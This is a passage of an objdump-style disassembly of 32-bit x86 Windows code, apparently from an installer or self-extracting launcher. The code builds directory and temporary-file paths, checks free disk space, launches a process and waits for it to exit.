  4017ca:	33 c5                	xor    %ebp,%eax
  4017cc:	89 85 88 00 00 00    	mov    %eax,0x88(%ebp)
  4017d2:	53                   	push   %ebx
  4017d3:	56                   	push   %esi
  4017d4:	8b b5 94 00 00 00    	mov    0x94(%ebp),%esi
  4017da:	57                   	push   %edi
  4017db:	8b 3d 18 90 40 00    	mov    0x409018,%edi
  4017e1:	56                   	push   %esi
  4017e2:	c7 45 80 01 00 00 00 	movl   $0x1,-0x80(%ebp)
  4017e9:	ff d7                	call   *%edi
  4017eb:	80 7c 06 ff 5c       	cmpb   $0x5c,-0x1(%esi,%eax,1)
  4017f0:	74 0c                	je     0x4017fe
  4017f2:	68 08 93 40 00       	push   $0x409308
  4017f7:	56                   	push   %esi
  4017f8:	ff 15 40 90 40 00    	call   *0x409040
  4017fe:	56                   	push   %esi
  4017ff:	ff d7                	call   *%edi
  401801:	68 04 01 00 00       	push   $0x104
  401806:	8b d8                	mov    %eax,%ebx
  401808:	33 ff                	xor    %edi,%edi
  40180a:	8d 45 84             	lea    -0x7c(%ebp),%eax
  40180d:	57                   	push   %edi
  40180e:	50                   	push   %eax
  40180f:	e8 4c 07 00 00       	call   0x401f60
  401814:	83 c4 0c             	add    $0xc,%esp
  401817:	83 fb 02             	cmp    $0x2,%ebx
  40181a:	7e 4b                	jle    0x401867
  40181c:	80 7e 01 3a          	cmpb   $0x3a,0x1(%esi)
  401820:	75 45                	jne    0x401867
  401822:	85 db                	test   %ebx,%ebx
  401824:	7e 44                	jle    0x40186a
  401826:	8d 45 84             	lea    -0x7c(%ebp),%eax
  401829:	2b f0                	sub    %eax,%esi
  40182b:	83 7d 80 00          	cmpl   $0x0,-0x80(%ebp)
  40182f:	74 39                	je     0x40186a
  401831:	8d 44 3d 84          	lea    -0x7c(%ebp,%edi,1),%eax
  401835:	8a 0c 06             	mov    (%esi,%eax,1),%cl
  401838:	80 f9 5c             	cmp    $0x5c,%cl
  40183b:	88 08                	mov    %cl,(%eax)
  40183d:	75 21                	jne    0x401860
  40183f:	83 ff 02             	cmp    $0x2,%edi
  401842:	74 1c                	je     0x401860
  401844:	8d 45 84             	lea    -0x7c(%ebp),%eax
  401847:	50                   	push   %eax
  401848:	ff 15 3c 90 40 00    	call   *0x40903c
  40184e:	85 c0                	test   %eax,%eax
  401850:	75 0e                	jne    0x401860
  401852:	50                   	push   %eax
  401853:	8d 45 84             	lea    -0x7c(%ebp),%eax
  401856:	50                   	push   %eax
  401857:	ff 15 38 90 40 00    	call   *0x409038
  40185d:	89 45 80             	mov    %eax,-0x80(%ebp)
  401860:	47                   	inc    %edi
  401861:	3b fb                	cmp    %ebx,%edi
  401863:	7c c6                	jl     0x40182b
  401865:	eb 03                	jmp    0x40186a
  401867:	89 7d 80             	mov    %edi,-0x80(%ebp)
  40186a:	8b 8d 88 00 00 00    	mov    0x88(%ebp),%ecx
  401870:	8b 45 80             	mov    -0x80(%ebp),%eax
  401873:	5f                   	pop    %edi
  401874:	5e                   	pop    %esi
  401875:	33 cd                	xor    %ebp,%ecx
  401877:	5b                   	pop    %ebx
  401878:	e8 5d 07 00 00       	call   0x401fda
  40187d:	81 c5 8c 00 00 00    	add    $0x8c,%ebp
  401883:	c9                   	leave
  401884:	c2 04 00             	ret    $0x4
  401887:	56                   	push   %esi
  401888:	57                   	push   %edi
  401889:	68 24 93 40 00       	push   $0x409324
  40188e:	33 ff                	xor    %edi,%edi
  401890:	ff 15 4c 90 40 00    	call   *0x40904c
  401896:	8b f0                	mov    %eax,%esi
  401898:	3b f7                	cmp    %edi,%esi
  40189a:	74 2f                	je     0x4018cb
  40189c:	39 7c 24 10          	cmp    %edi,0x10(%esp)
  4018a0:	74 29                	je     0x4018cb
  4018a2:	39 7c 24 0c          	cmp    %edi,0xc(%esp)
  4018a6:	74 23                	je     0x4018cb
  4018a8:	68 0c 93 40 00       	push   $0x40930c
  4018ad:	56                   	push   %esi
  4018ae:	ff 15 48 90 40 00    	call   *0x409048
  4018b4:	3b c7                	cmp    %edi,%eax
  4018b6:	74 0c                	je     0x4018c4
  4018b8:	ff 74 24 10          	push   0x10(%esp)
  4018bc:	ff 74 24 10          	push   0x10(%esp)
  4018c0:	ff d0                	call   *%eax
  4018c2:	8b f8                	mov    %eax,%edi
  4018c4:	56                   	push   %esi
  4018c5:	ff 15 44 90 40 00    	call   *0x409044
  4018cb:	8b c7                	mov    %edi,%eax
  4018cd:	5f                   	pop    %edi
  4018ce:	5e                   	pop    %esi
  4018cf:	c2 08 00             	ret    $0x8
  4018d2:	56                   	push   %esi
  4018d3:	8b f1                	mov    %ecx,%esi
  4018d5:	e8 4a fb ff ff       	call   0x401424
  4018da:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  4018df:	74 07                	je     0x4018e8
  4018e1:	56                   	push   %esi
  4018e2:	e8 48 15 00 00       	call   0x402e2f
  4018e7:	59                   	pop    %ecx
  4018e8:	8b c6                	mov    %esi,%eax
  4018ea:	5e                   	pop    %esi
  4018eb:	c2 04 00             	ret    $0x4
  4018ee:	55                   	push   %ebp
  4018ef:	8d ac 24 48 fc ff ff 	lea    -0x3b8(%esp),%ebp
  4018f6:	81 ec 38 04 00 00    	sub    $0x438,%esp
  4018fc:	a1 20 c0 40 00       	mov    0x40c020,%eax
  401901:	33 c5                	xor    %ebp,%eax
  401903:	89 85 b4 03 00 00    	mov    %eax,0x3b4(%ebp)
  401909:	83 65 9c 00          	andl   $0x0,-0x64(%ebp)
  40190d:	53                   	push   %ebx
  40190e:	56                   	push   %esi
  40190f:	57                   	push   %edi
  401910:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401913:	50                   	push   %eax
  401914:	8b d9                	mov    %ecx,%ebx
  401916:	be 04 01 00 00       	mov    $0x104,%esi
  40191b:	56                   	push   %esi
  40191c:	89 5d 94             	mov    %ebx,-0x6c(%ebp)
  40191f:	ff 15 64 90 40 00    	call   *0x409064
  401925:	56                   	push   %esi
  401926:	8d 85 b0 02 00 00    	lea    0x2b0(%ebp),%eax
  40192c:	6a 00                	push   $0x0
  40192e:	50                   	push   %eax
  40192f:	e8 2c 06 00 00       	call   0x401f60
  401934:	83 c4 0c             	add    $0xc,%esp
  401937:	8d 85 b0 02 00 00    	lea    0x2b0(%ebp),%eax
  40193d:	50                   	push   %eax
  40193e:	56                   	push   %esi
  40193f:	ff 15 60 90 40 00    	call   *0x409060
  401945:	8b 3d 18 90 40 00    	mov    0x409018,%edi
  40194b:	8d b3 08 10 00 00    	lea    0x1008(%ebx),%esi
  401951:	56                   	push   %esi
  401952:	ff d7                	call   *%edi
  401954:	83 f8 02             	cmp    $0x2,%eax
  401957:	7e 1a                	jle    0x401973
  401959:	56                   	push   %esi
  40195a:	8b cb                	mov    %ebx,%ecx
  40195c:	e8 56 fe ff ff       	call   0x4017b7
  401961:	85 c0                	test   %eax,%eax
  401963:	74 0e                	je     0x401973
  401965:	56                   	push   %esi
  401966:	8d 85 b0 02 00 00    	lea    0x2b0(%ebp),%eax
  40196c:	50                   	push   %eax
  40196d:	ff 15 14 90 40 00    	call   *0x409014
  401973:	8d b5 b0 02 00 00    	lea    0x2b0(%ebp),%esi
  401979:	8d 85 b0 02 00 00    	lea    0x2b0(%ebp),%eax
  40197f:	4e                   	dec    %esi
  401980:	50                   	push   %eax
  401981:	89 75 8c             	mov    %esi,-0x74(%ebp)
  401984:	ff d7                	call   *%edi
  401986:	80 3c 30 5c          	cmpb   $0x5c,(%eax,%esi,1)
  40198a:	74 12                	je     0x40199e
  40198c:	68 08 93 40 00       	push   $0x409308
  401991:	8d 85 b0 02 00 00    	lea    0x2b0(%ebp),%eax
  401997:	50                   	push   %eax
  401998:	ff 15 40 90 40 00    	call   *0x409040
  40199e:	8b 35 68 91 40 00    	mov    0x409168,%esi
  4019a4:	83 65 98 00          	andl   $0x0,-0x68(%ebp)
  4019a8:	6a 00                	push   $0x0
  4019aa:	68 ec 93 40 00       	push   $0x4093ec
  4019af:	8d 85 b0 02 00 00    	lea    0x2b0(%ebp),%eax
  4019b5:	50                   	push   %eax
  4019b6:	8d 85 ac 01 00 00    	lea    0x1ac(%ebp),%eax
  4019bc:	68 e4 93 40 00       	push   $0x4093e4
  4019c1:	50                   	push   %eax
  4019c2:	ff d6                	call   *%esi
  4019c4:	8d 85 ac 01 00 00    	lea    0x1ac(%ebp),%eax
  4019ca:	50                   	push   %eax
  4019cb:	8d 85 a8 00 00 00    	lea    0xa8(%ebp),%eax
  4019d1:	68 d4 93 40 00       	push   $0x4093d4
  4019d6:	50                   	push   %eax
  4019d7:	ff d6                	call   *%esi
  4019d9:	8b 3d 5c 90 40 00    	mov    0x40905c,%edi
  4019df:	83 c4 20             	add    $0x20,%esp
  4019e2:	8d 85 a8 00 00 00    	lea    0xa8(%ebp),%eax
  4019e8:	50                   	push   %eax
  4019e9:	ff d7                	call   *%edi
  4019eb:	8b 1d 58 90 40 00    	mov    0x409058,%ebx
  4019f1:	eb 41                	jmp    0x401a34
  4019f3:	ff 45 98             	incl   -0x68(%ebp)
  4019f6:	ff 75 98             	push   -0x68(%ebp)
  4019f9:	8d 85 b0 02 00 00    	lea    0x2b0(%ebp),%eax
  4019ff:	68 ec 93 40 00       	push   $0x4093ec
  401a04:	50                   	push   %eax
  401a05:	8d 85 ac 01 00 00    	lea    0x1ac(%ebp),%eax
  401a0b:	68 e4 93 40 00       	push   $0x4093e4
  401a10:	50                   	push   %eax
  401a11:	ff d6                	call   *%esi
  401a13:	8d 85 ac 01 00 00    	lea    0x1ac(%ebp),%eax
  401a19:	50                   	push   %eax
  401a1a:	8d 85 a8 00 00 00    	lea    0xa8(%ebp),%eax
  401a20:	68 d4 93 40 00       	push   $0x4093d4
  401a25:	50                   	push   %eax
  401a26:	ff d6                	call   *%esi
  401a28:	83 c4 20             	add    $0x20,%esp
  401a2b:	8d 85 a8 00 00 00    	lea    0xa8(%ebp),%eax
  401a31:	50                   	push   %eax
  401a32:	ff d7                	call   *%edi
  401a34:	8d 85 ac 01 00 00    	lea    0x1ac(%ebp),%eax
  401a3a:	50                   	push   %eax
  401a3b:	ff d3                	call   *%ebx
  401a3d:	8d 85 ac 01 00 00    	lea    0x1ac(%ebp),%eax
  401a43:	50                   	push   %eax
  401a44:	ff 15 90 90 40 00    	call   *0x409090
  401a4a:	83 f8 ff             	cmp    $0xffffffff,%eax
  401a4d:	75 a4                	jne    0x4019f3
  401a4f:	8b 3d 38 90 40 00    	mov    0x409038,%edi
  401a55:	6a 00                	push   $0x0
  401a57:	8d 85 ac 01 00 00    	lea    0x1ac(%ebp),%eax
  401a5d:	50                   	push   %eax
  401a5e:	ff d7                	call   *%edi
  401a60:	8b 35 14 90 40 00    	mov    0x409014,%esi
  401a66:	8d 85 ac 01 00 00    	lea    0x1ac(%ebp),%eax
  401a6c:	50                   	push   %eax
  401a6d:	8d 85 b0 02 00 00    	lea    0x2b0(%ebp),%eax
  401a73:	50                   	push   %eax
  401a74:	ff d6                	call   *%esi
  401a76:	8b 1d 3c 90 40 00    	mov    0x40903c,%ebx
  401a7c:	8d 85 b0 02 00 00    	lea    0x2b0(%ebp),%eax
  401a82:	50                   	push   %eax
  401a83:	ff d3                	call   *%ebx
  401a85:	85 c0                	test   %eax,%eax
  401a87:	75 19                	jne    0x401aa2
  401a89:	68 cc 93 40 00       	push   $0x4093cc
  401a8e:	8d 85 b0 02 00 00    	lea    0x2b0(%ebp),%eax
  401a94:	50                   	push   %eax
  401a95:	ff d6                	call   *%esi
  401a97:	6a 00                	push   $0x0
  401a99:	8d 85 b0 02 00 00    	lea    0x2b0(%ebp),%eax
  401a9f:	50                   	push   %eax
  401aa0:	ff d7                	call   *%edi
  401aa2:	8d 85 b0 02 00 00    	lea    0x2b0(%ebp),%eax
  401aa8:	50                   	push   %eax
  401aa9:	ff d3                	call   *%ebx
  401aab:	85 c0                	test   %eax,%eax
  401aad:	8b 7d 94             	mov    -0x6c(%ebp),%edi
  401ab0:	75 12                	jne    0x401ac4
  401ab2:	68 80 93 40 00       	push   $0x409380
  401ab7:	8d 47 08             	lea    0x8(%edi),%eax
  401aba:	50                   	push   %eax
  401abb:	ff d6                	call   *%esi
  401abd:	c7 45 9c 38 00 00 00 	movl   $0x38,-0x64(%ebp)
  401ac4:	8d 85 b0 02 00 00    	lea    0x2b0(%ebp),%eax
  401aca:	50                   	push   %eax
  401acb:	ff 15 18 90 40 00    	call   *0x409018
  401ad1:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  401ad4:	80 3c 08 5c          	cmpb   $0x5c,(%eax,%ecx,1)
  401ad8:	74 12                	je     0x401aec
  401ada:	68 08 93 40 00       	push   $0x409308
  401adf:	8d 85 b0 02 00 00    	lea    0x2b0(%ebp),%eax
  401ae5:	50                   	push   %eax
  401ae6:	ff 15 40 90 40 00    	call   *0x409040
  401aec:	8d 85 b0 02 00 00    	lea    0x2b0(%ebp),%eax
  401af2:	50                   	push   %eax
  401af3:	8d 9f 24 12 00 00    	lea    0x1224(%edi),%ebx
  401af9:	53                   	push   %ebx
  401afa:	ff d6                	call   *%esi
  401afc:	8d 85 b0 02 00 00    	lea    0x2b0(%ebp),%eax
  401b02:	50                   	push   %eax
  401b03:	8d 87 28 13 00 00    	lea    0x1328(%edi),%eax
  401b09:	50                   	push   %eax
  401b0a:	ff d6                	call   *%esi
  401b0c:	68 74 93 40 00       	push   $0x409374
  401b11:	53                   	push   %ebx
  401b12:	ff 15 40 90 40 00    	call   *0x409040
  401b18:	8a 85 b0 02 00 00    	mov    0x2b0(%ebp),%al
  401b1e:	88 45 a0             	mov    %al,-0x60(%ebp)
  401b21:	8a 85 b1 02 00 00    	mov    0x2b1(%ebp),%al
  401b27:	88 45 a1             	mov    %al,-0x5f(%ebp)
  401b2a:	8a 85 b2 02 00 00    	mov    0x2b2(%ebp),%al
  401b30:	88 45 a2             	mov    %al,-0x5e(%ebp)
  401b33:	8d 45 80             	lea    -0x80(%ebp),%eax
  401b36:	50                   	push   %eax
  401b37:	8d 45 88             	lea    -0x78(%ebp),%eax
  401b3a:	50                   	push   %eax
  401b3b:	8d 45 90             	lea    -0x70(%ebp),%eax
  401b3e:	50                   	push   %eax
  401b3f:	8d 45 84             	lea    -0x7c(%ebp),%eax
  401b42:	50                   	push   %eax
  401b43:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401b46:	50                   	push   %eax
  401b47:	c6 45 a3 00          	movb   $0x0,-0x5d(%ebp)
  401b4b:	ff 15 50 90 40 00    	call   *0x409050
  401b51:	85 c0                	test   %eax,%eax
  401b53:	74 17                	je     0x401b6c
  401b55:	8b 45 84             	mov    -0x7c(%ebp),%eax
  401b58:	0f af 45 90          	imul   -0x70(%ebp),%eax
  401b5c:	f7 65 88             	mull   -0x78(%ebp)
  401b5f:	85 d2                	test   %edx,%edx
  401b61:	7f 1b                	jg     0x401b7e
  401b63:	7c 07                	jl     0x401b6c
  401b65:	3d 80 84 1e 00       	cmp    $0x1e8480,%eax
  401b6a:	73 12                	jae    0x401b7e
  401b6c:	68 34 93 40 00       	push   $0x409334
  401b71:	83 c7 08             	add    $0x8,%edi
  401b74:	57                   	push   %edi
  401b75:	ff d6                	call   *%esi
  401b77:	c7 45 9c 39 00 00 00 	movl   $0x39,-0x64(%ebp)
  401b7e:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401b81:	50                   	push   %eax
  401b82:	ff 15 3c 90 40 00    	call   *0x40903c
  401b88:	8b 8d b4 03 00 00    	mov    0x3b4(%ebp),%ecx
  401b8e:	8b 45 9c             	mov    -0x64(%ebp),%eax
  401b91:	5f                   	pop    %edi
  401b92:	5e                   	pop    %esi
  401b93:	33 cd                	xor    %ebp,%ecx
  401b95:	5b                   	pop    %ebx
  401b96:	e8 3f 04 00 00       	call   0x401fda
  401b9b:	81 c5 b8 03 00 00    	add    $0x3b8,%ebp
  401ba1:	c9                   	leave
  401ba2:	c3                   	ret
  401ba3:	55                   	push   %ebp
  401ba4:	8d ac 24 9c fe ff ff 	lea    -0x164(%esp),%ebp
  401bab:	81 ec e4 01 00 00    	sub    $0x1e4,%esp
  401bb1:	a1 20 c0 40 00       	mov    0x40c020,%eax
  401bb6:	33 c5                	xor    %ebp,%eax
  401bb8:	89 85 60 01 00 00    	mov    %eax,0x160(%ebp)
  401bbe:	53                   	push   %ebx
  401bbf:	56                   	push   %esi
  401bc0:	57                   	push   %edi
  401bc1:	33 db                	xor    %ebx,%ebx
  401bc3:	6a 40                	push   $0x40
  401bc5:	8d 45 84             	lea    -0x7c(%ebp),%eax
  401bc8:	53                   	push   %ebx
  401bc9:	50                   	push   %eax
  401bca:	8b f1                	mov    %ecx,%esi
  401bcc:	89 5d 80             	mov    %ebx,-0x80(%ebp)
  401bcf:	e8 8c 03 00 00       	call   0x401f60
  401bd4:	33 c0                	xor    %eax,%eax
  401bd6:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
  401bd9:	8d 7d c8             	lea    -0x38(%ebp),%edi
  401bdc:	ab                   	stos   %eax,%es:(%edi)
  401bdd:	ab                   	stos   %eax,%es:(%edi)
  401bde:	6a 44                	push   $0x44
  401be0:	ab                   	stos   %eax,%es:(%edi)
  401be1:	5f                   	pop    %edi
  401be2:	57                   	push   %edi
  401be3:	8d 45 80             	lea    -0x80(%ebp),%eax
  401be6:	53                   	push   %ebx
  401be7:	50                   	push   %eax
  401be8:	e8 73 03 00 00       	call   0x401f60
  401bed:	6a 10                	push   $0x10
  401bef:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  401bf2:	53                   	push   %ebx
  401bf3:	50                   	push   %eax
  401bf4:	e8 67 03 00 00       	call   0x401f60
  401bf9:	8b 86 38 14 00 00    	mov    0x1438(%esi),%eax
  401bff:	03 86 30 14 00 00    	add    0x1430(%esi),%eax
  401c05:	8b 8e 3c 14 00 00    	mov    0x143c(%esi),%ecx
  401c0b:	13 8e 34 14 00 00    	adc    0x1434(%esi),%ecx
  401c11:	89 7d 80             	mov    %edi,-0x80(%ebp)
  401c14:	51                   	push   %ecx
  401c15:	50                   	push   %eax
  401c16:	8d 45 3c             	lea    0x3c(%ebp),%eax
  401c19:	68 5c 94 40 00       	push   $0x40945c
  401c1e:	50                   	push   %eax
  401c1f:	89 5d 84             	mov    %ebx,-0x7c(%ebp)
  401c22:	89 5d b4             	mov    %ebx,-0x4c(%ebp)
  401c25:	66 89 5d b2          	mov    %bx,-0x4e(%ebp)
  401c29:	89 5d 88             	mov    %ebx,-0x78(%ebp)
  401c2c:	89 5d ac             	mov    %ebx,-0x54(%ebp)
  401c2f:	ff 15 68 91 40 00    	call   *0x409168
  401c35:	83 c4 34             	add    $0x34,%esp
  401c38:	8d 86 08 08 00 00    	lea    0x808(%esi),%eax
  401c3e:	50                   	push   %eax
  401c3f:	ff 15 18 90 40 00    	call   *0x409018
  401c45:	85 c0                	test   %eax,%eax
  401c47:	8b 3d 40 90 40 00    	mov    0x409040,%edi
  401c4d:	74 0e                	je     0x401c5d
  401c4f:	68 58 94 40 00       	push   $0x409458
  401c54:	8d 86 08 08 00 00    	lea    0x808(%esi),%eax
  401c5a:	50                   	push   %eax
  401c5b:	ff d7                	call   *%edi
  401c5d:	8d 45 3c             	lea    0x3c(%ebp),%eax
  401c60:	50                   	push   %eax
  401c61:	8d 86 08 08 00 00    	lea    0x808(%esi),%eax
  401c67:	50                   	push   %eax
  401c68:	ff d7                	call   *%edi
  401c6a:	8d 86 20 11 00 00    	lea    0x1120(%esi),%eax
  401c70:	50                   	push   %eax
  401c71:	8d 45 3c             	lea    0x3c(%ebp),%eax
  401c74:	68 48 94 40 00       	push   $0x409448
  401c79:	50                   	push   %eax
  401c7a:	ff 15 68 91 40 00    	call   *0x409168
  401c80:	83 c4 0c             	add    $0xc,%esp
  401c83:	68 58 94 40 00       	push   $0x409458
  401c88:	8d 86 08 08 00 00    	lea    0x808(%esi),%eax
  401c8e:	50                   	push   %eax
  401c8f:	ff d7                	call   *%edi
  401c91:	8d 45 3c             	lea    0x3c(%ebp),%eax
  401c94:	50                   	push   %eax
  401c95:	8d 86 08 08 00 00    	lea    0x808(%esi),%eax
  401c9b:	50                   	push   %eax
  401c9c:	ff d7                	call   *%edi
  401c9e:	0f b6 86 14 11 00 00 	movzbl 0x1114(%esi),%eax
  401ca5:	50                   	push   %eax
  401ca6:	8d 45 3c             	lea    0x3c(%ebp),%eax
  401ca9:	68 3c 94 40 00       	push   $0x40943c
  401cae:	50                   	push   %eax
  401caf:	ff 15 68 91 40 00    	call   *0x409168
  401cb5:	83 c4 0c             	add    $0xc,%esp
  401cb8:	68 58 94 40 00       	push   $0x409458
  401cbd:	8d 86 08 08 00 00    	lea    0x808(%esi),%eax
  401cc3:	50                   	push   %eax
  401cc4:	ff d7                	call   *%edi
  401cc6:	8d 45 3c             	lea    0x3c(%ebp),%eax
  401cc9:	50                   	push   %eax
  401cca:	8d 86 08 08 00 00    	lea    0x808(%esi),%eax
  401cd0:	50                   	push   %eax
  401cd1:	ff d7                	call   *%edi
  401cd3:	ff b6 1c 11 00 00    	push   0x111c(%esi)
  401cd9:	8d 45 3c             	lea    0x3c(%ebp),%eax
  401cdc:	ff b6 18 11 00 00    	push   0x1118(%esi)
  401ce2:	68 2c 94 40 00       	push   $0x40942c
  401ce7:	50                   	push   %eax
  401ce8:	ff 15 68 91 40 00    	call   *0x409168
  401cee:	83 c4 10             	add    $0x10,%esp
  401cf1:	68 58 94 40 00       	push   $0x409458
  401cf6:	8d 86 08 08 00 00    	lea    0x808(%esi),%eax
  401cfc:	50                   	push   %eax
  401cfd:	ff d7                	call   *%edi
  401cff:	8d 45 3c             	lea    0x3c(%ebp),%eax
  401d02:	50                   	push   %eax
  401d03:	8d 86 08 08 00 00    	lea    0x808(%esi),%eax
  401d09:	50                   	push   %eax
  401d0a:	ff d7                	call   *%edi
  401d0c:	8d 45 34             	lea    0x34(%ebp),%eax
  401d0f:	50                   	push   %eax
  401d10:	6a 08                	push   $0x8
  401d12:	89 5d 34             	mov    %ebx,0x34(%ebp)
  401d15:	ff 15 8c 90 40 00    	call   *0x40908c
  401d1b:	50                   	push   %eax
  401d1c:	ff 15 04 90 40 00    	call   *0x409004
  401d22:	85 c0                	test   %eax,%eax
  401d24:	0f 84 8c 00 00 00    	je     0x401db6
  401d2a:	68 00 40 00 00       	push   $0x4000
  401d2f:	89 5d 2c             	mov    %ebx,0x2c(%ebp)
  401d32:	e8 35 10 00 00       	call   0x402d6c
  401d37:	3b c3                	cmp    %ebx,%eax
  401d39:	59                   	pop    %ecx
  401d3a:	89 45 30             	mov    %eax,0x30(%ebp)
  401d3d:	74 77                	je     0x401db6
  401d3f:	8d 4d 2c             	lea    0x2c(%ebp),%ecx
  401d42:	51                   	push   %ecx
  401d43:	68 00 40 00 00       	push   $0x4000
  401d48:	50                   	push   %eax
  401d49:	6a 01                	push   $0x1
  401d4b:	ff 75 34             	push   0x34(%ebp)
  401d4e:	ff 15 00 90 40 00    	call   *0x409000
  401d54:	85 c0                	test   %eax,%eax
  401d56:	74 5e                	je     0x401db6
  401d58:	8d 45 38             	lea    0x38(%ebp),%eax
  401d5b:	50                   	push   %eax
  401d5c:	8b 45 30             	mov    0x30(%ebp),%eax
  401d5f:	ff 30                	push   (%eax)
  401d61:	8b ce                	mov    %esi,%ecx
  401d63:	89 5d 38             	mov    %ebx,0x38(%ebp)
  401d66:	e8 1c fb ff ff       	call   0x401887
  401d6b:	85 c0                	test   %eax,%eax
  401d6d:	74 3e                	je     0x401dad
  401d6f:	39 5d 38             	cmp    %ebx,0x38(%ebp)
  401d72:	74 39                	je     0x401dad
  401d74:	ff 75 38             	push   0x38(%ebp)
  401d77:	8d 45 3c             	lea    0x3c(%ebp),%eax
  401d7a:	68 1c 94 40 00       	push   $0x40941c
  401d7f:	50                   	push   %eax
  401d80:	ff 15 68 91 40 00    	call   *0x409168
  401d86:	83 c4 0c             	add    $0xc,%esp
  401d89:	68 58 94 40 00       	push   $0x409458
  401d8e:	8d 86 08 08 00 00    	lea    0x808(%esi),%eax
  401d94:	50                   	push   %eax
  401d95:	ff d7                	call   *%edi
  401d97:	8d 45 3c             	lea    0x3c(%ebp),%eax
  401d9a:	50                   	push   %eax
  401d9b:	8d 86 08 08 00 00    	lea    0x808(%esi),%eax
  401da1:	50                   	push   %eax
  401da2:	ff d7                	call   *%edi
  401da4:	ff 75 38             	push   0x38(%ebp)
  401da7:	ff 15 70 90 40 00    	call   *0x409070
  401dad:	ff 75 30             	push   0x30(%ebp)
  401db0:	e8 da 0e 00 00       	call   0x402c8f
  401db5:	59                   	pop    %ecx
  401db6:	39 1d 44 d0 40 00    	cmp    %ebx,0x40d044
  401dbc:	74 16                	je     0x401dd4
  401dbe:	53                   	push   %ebx
  401dbf:	8d 86 24 12 00 00    	lea    0x1224(%esi),%eax
  401dc5:	50                   	push   %eax
  401dc6:	8d 86 08 08 00 00    	lea    0x808(%esi),%eax
  401dcc:	50                   	push   %eax
  401dcd:	53                   	push   %ebx
  401dce:	ff 15 74 91 40 00    	call   *0x409174
  401dd4:	6a 3c                	push   $0x3c
  401dd6:	5f                   	pop    %edi
  401dd7:	57                   	push   %edi
  401dd8:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401ddb:	53                   	push   %ebx
  401ddc:	50                   	push   %eax
  401ddd:	e8 7e 01 00 00       	call   0x401f60
  401de2:	8d 86 24 12 00 00    	lea    0x1224(%esi),%eax
  401de8:	89 45 00             	mov    %eax,0x0(%ebp)
  401deb:	89 7d f0             	mov    %edi,-0x10(%ebp)
  401dee:	8d 86 08 08 00 00    	lea    0x808(%esi),%eax
  401df4:	89 45 04             	mov    %eax,0x4(%ebp)
  401df7:	83 c4 0c             	add    $0xc,%esp
  401dfa:	33 ff                	xor    %edi,%edi
  401dfc:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401dff:	47                   	inc    %edi
  401e00:	50                   	push   %eax
  401e01:	c7 45 f4 40 00 00 00 	movl   $0x40,-0xc(%ebp)
  401e08:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  401e0b:	c7 45 fc 14 94 40 00 	movl   $0x409414,-0x4(%ebp)
  401e12:	89 5d 08             	mov    %ebx,0x8(%ebp)
  401e15:	89 7d 0c             	mov    %edi,0xc(%ebp)
  401e18:	89 5d 10             	mov    %ebx,0x10(%ebp)
  401e1b:	ff 15 54 91 40 00    	call   *0x409154
  401e21:	85 c0                	test   %eax,%eax
  401e23:	75 1b                	jne    0x401e40
  401e25:	68 f8 93 40 00       	push   $0x4093f8
  401e2a:	83 c6 08             	add    $0x8,%esi
  401e2d:	56                   	push   %esi
  401e2e:	ff 15 14 90 40 00    	call   *0x409014
  401e34:	c7 45 38 37 00 00 00 	movl   $0x37,0x38(%ebp)
  401e3b:	e9 90 00 00 00       	jmp    0x401ed0
  401e40:	39 9e 0c 11 00 00    	cmp    %ebx,0x110c(%esi)
  401e46:	74 4e                	je     0x401e96
  401e48:	eb 35                	jmp    0x401e7f
  401e4a:	83 7d d8 0f          	cmpl   $0xf,-0x28(%ebp)
  401e4e:	74 09                	je     0x401e59
  401e50:	81 7d d8 00 02 00 00 	cmpl   $0x200,-0x28(%ebp)
  401e57:	75 14                	jne    0x401e6d
  401e59:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  401e5c:	50                   	push   %eax
  401e5d:	ff 15 5c 91 40 00    	call   *0x40915c
  401e63:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  401e66:	50                   	push   %eax
  401e67:	ff 15 60 91 40 00    	call   *0x409160
  401e6d:	57                   	push   %edi
  401e6e:	53                   	push   %ebx
  401e6f:	53                   	push   %ebx
  401e70:	53                   	push   %ebx
  401e71:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  401e74:	50                   	push   %eax
  401e75:	ff 15 64 91 40 00    	call   *0x409164
  401e7b:	85 c0                	test   %eax,%eax
  401e7d:	7f cb                	jg     0x401e4a
  401e7f:	68 ff 00 00 00       	push   $0xff
  401e84:	6a ff                	push   $0xffffffff
  401e86:	53                   	push   %ebx
  401e87:	8d 45 28             	lea    0x28(%ebp),%eax
  401e8a:	50                   	push   %eax
  401e8b:	57                   	push   %edi
  401e8c:	ff 15 78 91 40 00    	call   *0x409178
  401e92:	3b c7                	cmp    %edi,%eax
  401e94:	74 d7                	je     0x401e6d
  401e96:	8d 86 44 14 00 00    	lea    0x1444(%esi),%eax
  401e9c:	50                   	push   %eax
  401e9d:	ff 75 28             	push   0x28(%ebp)
  401ea0:	ff 15 6c 90 40 00    	call   *0x40906c
  401ea6:	8b 86 44 14 00 00    	mov    0x1444(%esi),%eax
  401eac:	3d 03 01 00 00       	cmp    $0x103,%eax
  401eb1:	89 45 38             	mov    %eax,0x38(%ebp)
  401eb4:	89 be 10 11 00 00    	mov    %edi,0x1110(%esi)
  401eba:	75 0b                	jne    0x401ec7
  401ebc:	39 9e 0c 11 00 00    	cmp    %ebx,0x110c(%esi)
  401ec2:	75 03                	jne    0x401ec7
  401ec4:	89 5d 38             	mov    %ebx,0x38(%ebp)
  401ec7:	ff 75 28             	push   0x28(%ebp)
  401eca:	ff 15 68 90 40 00    	call   *0x409068
  401ed0:	8b 8d 60 01 00 00    	mov    0x160(%ebp),%ecx
  401ed6:	8b 45 38             	mov    0x38(%ebp),%eax
  401ed9:	5f                   	pop    %edi
  401eda:	5e                   	pop    %esi
  401edb:	33 cd                	xor    %ebp,%ecx
  401edd:	5b                   	pop    %ebx
  401ede:	e8 f7 00 00 00       	call   0x401fda
  401ee3:	81 c5 64 01 00 00    	add    $0x164,%ebp
  401ee9:	c9                   	leave
  401eea:	c3                   	ret
  401eeb:	56                   	push   %esi
  401eec:	57                   	push   %edi
